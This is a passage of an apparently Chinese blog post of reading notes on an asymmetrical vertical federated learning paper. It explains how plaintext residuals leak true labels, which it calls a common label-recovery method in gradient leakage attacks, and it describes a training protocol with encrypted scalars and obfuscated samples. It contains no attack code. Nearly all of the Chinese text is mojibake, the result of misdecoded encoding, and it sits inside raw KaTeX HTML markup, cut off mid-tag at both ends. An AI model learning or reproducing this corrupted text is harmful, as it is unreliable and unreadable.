class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mtext>â€‰â£</mtext><mo stretchy="false">[</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mtext>â€‰â£</mtext><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[\![(y_i-\hat{y_i})]\!]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="mopen">[(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mclose">)]</span><span class="mspace" style="margin-right:-0.1667em;"></span><span class="mclose">]</span></span></span></span> çš„åŸå› åœ¨äºæ˜æ–‡çš„**<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>âˆ’</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(y_i-\hat{y_i})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mclose">)</span></span></span></span> åœ¨åˆ†ç±»ä»»åŠ¡ä¸­ä¼šæ³„éœ²ä¿¡æ¯**ï¼Œç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>â‰¤</mo><mover accent="true"><msub><mi>y</mi><mi>i</mi></msub><mo>^</mo></mover><mo>â‰¤</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\le\hat{y_i}\le1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.25em;"><span class="mord">^</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1944em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼ŒçœŸå®æ ‡ç­¾<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">y_i=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> åˆ™å¼å­ä¸ºè´Ÿæ•°ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_i=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> åˆ™å¯¹åº”å¼å­ä¸ºæ­£æ•°ã€‚è¡¥å……ï¼šè¿™åœ¨æ¢¯åº¦æ³„éœ²æ”»å‡»ä¸­æ˜¯ä¸€ç§å¸¸ç”¨çš„æ¢å¤çœŸå®æ ‡ç­¾çš„æ–¹æ³•ã€‚</p><p><em>ï¼ˆä¸æ˜ç™½è®¡ç®—æœºæ˜¯æ€ä¹ˆè®¡ç®—æ¢¯åº¦çš„ï¼Œä»…åˆ©ç”¨åŠ æ³•åŒæ€å°±èƒ½è®¡ç®—å‡ºæ¢¯åº¦ï¼Ÿï¼‰</em></p><p>æ¥ç€å†çœ‹ä»¥<strong>æ— åè°ƒè€…çš„çºµå‘è”é‚¦é€»è¾‘å›å½’è®­ç»ƒ</strong>ä¸ºåŸºç¡€ï¼Œä½¿ç”¨<code>GWD</code>æ–¹æ³•å°†å…¶è°ƒæ•´ä¸ºä¸å¯¹ç§°çš„è®­ç»ƒåè®®ï¼Œç„¶åä½¿ç”¨ç®—æ³•2ä¸­æå‡ºçš„éå¯¹ç§°çºµå‘é€»è¾‘å›å½’ï¼ˆAVLRï¼‰è®­ç»ƒåè®®è¿›è¡Œè®­ç»ƒã€‚ï¼ˆæ³¨æ„ï¼š<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯¹åº”ä¸Šè¡¨ä¸­çš„Party Aï¼Œè€Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å¯¹åº”ä¸Šè¡¨ä¸­çš„Party Bï¼‰</p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718121752417.png" alt></p><p><img src="/2022/07/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4-2021-Asymmetrical-Vertical-Federated-Learning-%E7%AC%94%E8%AE%B0/image-20220718121809066.png" alt></p><blockquote><p>å¯¹äºå­˜åœ¨äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>I</mi><mn>1</mn><mi>o</mi></msubsup><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msub><mi>I</mi><mn>1</mn></msub><mo>âˆ©</mo><msub><mi>I</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_1^o/(I_1 \cap I_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> çš„æ ·æœ¬ï¼Œè¿™é‡Œçš„å¤„ç†æ ¸å¿ƒåœ¨äºç¬¬5æ­¥ï¼šç”±äº<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn mathvariant="script">2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P_2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çŸ¥é“å“ªäº›æ ·æœ¬ä»…åœ¨<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mn>1</mn></msub><mo>âˆ©</mo><msub><mi>I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">I_1\cap I_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸­ï¼Œå“ªäº›æ ·æœ¬æ˜¯æ·»åŠ çš„æ··æ·†æ ·æœ¬ï¼Œå› æ­¤ä»–å¯ä»¥ç›´æ¥æŠŠæ¥è‡ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>I</mi><mn>1</mn><mi>o</mi></msubsup><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><msub><mi>I</mi><mn>1</mn></msub><mo>âˆ©</mo><msub><mi>I</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I_1^o/(I_1 \cap I_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ©</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> çš„æ ·æœ¬å¯¹åº”çš„æŸå¤±è®¾ç½®ä¸º0è¿›è¡Œå¤„ç†ã€‚</p></blockquote><p>ç®—æ³•2çš„æ ¸å¿ƒåœ¨äºç¬¬5ã€6æ­¥ä¸­è®©å¼±æ–¹<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å…±äº«åŠ å¯†çš„<code>æ ‡é‡ï¼ˆscalarsï¼‰</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">âŸ¨</mo><msub><mi>Ï•</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><mo fence="true">âŸ©</mo></mrow><annotation encoding="application/x-tex">\left\langle\phi_{i k}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âŸ¨</span><span class="mord"><span class="mord mathnormal">Ï•</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âŸ©</span></span></span></span></span>ï¼Œä»¥ä¾¿è®©<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> è®¡ç®—å‡ºåŠ å¯†çš„æœ¬åœ°æ¢¯åº¦<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">âŸ¨</mo><msup><mi mathvariant="normal">âˆ‡</mi><mi>s</mi></msup><mi mathvariant="script">L</mi><mrow><mo fence="true">(</mo><msub><mi mathvariant="bold">w</mi><mi>k</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">âŸ©</mo></mrow><annotation encoding="application/x-tex">\left\langle\nabla^{s} \mathcal{L}\left(\mathbf{w}_{k}\right)\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âŸ¨</span><span class="mord"><span class="mord">âˆ‡</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mord mathcal">L</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathbf" style="margin-right:0.01597em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.016em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">âŸ©</span></span></span></span></span>ï¼Œæ ‡é‡<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">âŸ¨</mo><msub><mi>Ï•</mi><mrow><mi>i</mi><mi>k</mi></mrow></msub><mo fence="true">âŸ©</mo></mrow><annotation encoding="application/x-tex">\left\langle\phi_{i k}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âŸ¨</span><span class="mord"><span class="mord mathnormal">Ï•</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">ik</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âŸ©</span></span></span></span></span> çš„æå‡ºç›´æ¥ä½“ç°äº†<code>GWD</code>çš„æ€æƒ³ã€‚</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¼šåœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mi>k</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}_k^{obf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2683em;vertical-align:-0.3013em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.3987em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span></span></span></span></span></span></span></span></span></span> å¯¹åº”çš„æ ·æœ¬ä¸Šè®¡ç®—æ¢¯åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">âŸ¨</mo><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>âˆ©</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mo>â‹…</mo><msup><mi mathvariant="normal">âˆ‡</mi><mi>s</mi></msup><mi mathvariant="script">L</mi><mrow><mo fence="true">(</mo><msub><mi 